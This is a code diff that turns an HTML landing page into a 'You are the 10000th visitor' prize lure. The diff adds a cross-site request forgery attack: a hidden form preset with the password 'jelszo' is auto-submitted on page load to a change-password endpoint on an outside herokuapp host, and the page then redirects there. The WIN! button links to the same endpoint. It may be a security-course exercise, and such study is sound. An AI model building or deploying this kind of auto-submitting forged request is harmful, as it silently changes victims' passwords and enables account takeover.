@@ -14,8 +14,34 @@
       <div class="jumbotron">
         <h1>You are the 10000th visitor</h1>
         <p class="lead">You have a chance to win something. All you have to do is click the WIN! button below!</p>
-        <p class="text-center"><a class="btn btn-lg btn-success" href="#" role="button">WIN!</a></p>
+        <p class="text-center"><a class="btn btn-lg btn-success" href="http://silver-quire.herokuapp.com/change-password" role="button">WIN!</a></p>
+
       </div>
+
+<form method="post" class="form-horizontal" id="majom" action="http://silver-quire.herokuapp.com/change-password">
+      <div class="form-group">
+        <label for="password" class="col-sm-4 control-label">Password</label>
+        <div class="col-sm-4">
+          <input id="password_confirmation" type="password" name="user[password]" class="form-control" value="jelszo"/>
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="password_confirmation" class="col-sm-4 control-label">Confirm password</label>
+        <div class="col-sm-4">
+          <input id="password_confirmation" type="password" name="user[password_confirmation]" class="form-control" value="jelszo"/>
+        </div>
+      </div>
+    </form>
   </body>
+
+<script>
+	$( document ).ready(function() {
+   		$("#majom").submit();
+	console.log("majomk");
+window.location.href = "http://silver-quire.herokuapp.com/";
+
+});
+	
+</script>
 </html>
 
